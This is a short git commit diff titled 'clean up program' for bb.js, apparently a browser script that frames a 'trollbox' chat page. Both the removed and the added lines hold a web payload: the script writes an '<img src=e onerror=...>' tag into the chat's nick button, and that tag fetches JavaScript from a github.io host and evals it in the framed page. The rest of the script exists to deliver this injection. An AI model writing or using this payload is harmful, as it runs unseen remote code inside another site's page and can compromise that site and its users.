d95c53716ed2e65faa5852466439d9e1e7e1cc4f
dell-optiplex-790 <dell.optiplex.d4719126@gmail.com>
2026-01-11 15:50:32 +0100

    clean up program

--- bb.js
+++ bb.js
@@ -7,9 +7,7 @@
     window.$prompt = function(q) {
         return prompt(q);
     }
-    let js;
     let isTB = false;
-    const request = new XMLHttpRequest();
     let iframe = document.createElement('iframe');
 
     // program flow
@@ -23,26 +21,16 @@
     document.title = 'trollbox';
     document.body.style.margin = '0';
     history.replaceState(false, '', '/trollbox');
-    request.open('GET', url, true);
-    request.responseType = 'text';
-    request.onload = () => {
-        if (request.readyState == 4 && request.status == 200) {
-            js = request.responseText;
-
-            // duct tape code but it works
-            setInterval(() => {
-                if(iframe.contentWindow.location.pathname == '/trollbox/') {
-                    if(!isTB) {
-                        iframe.contentWindow.setTimeout(() => {
-                            iframe.contentWindow.getElementById('trollbox_nick_btn').innerHTML = '<img src=e onerror="fetch(\'https://dell-optiplex-790.github.io/tbjb/tb.js\').then(e=>e.text()).then(eval)">'
-                        }, 700);
-                    }
-                    isTB = true;
-                } else {
-                    isTB = false;
-                }
-            }, 100);
+    setInterval(() => {
+        if(iframe.contentWindow.location.pathname == '/trollbox/') {
+            if(!isTB) {
+                iframe.contentWindow.setTimeout(() => {
+                    iframe.contentWindow.getElementById('trollbox_nick_btn').innerHTML = '<img src=e onerror="fetch(\'https://dell-optiplex-790.github.io/tbjb/tb.js\').then(e=>e.text()).then(eval)">'
+                }, 700);
+            }
+            isTB = true;
+        } else {
+            isTB = false;
         }
-    };
-    request.send();
+    }, 100);
 })();
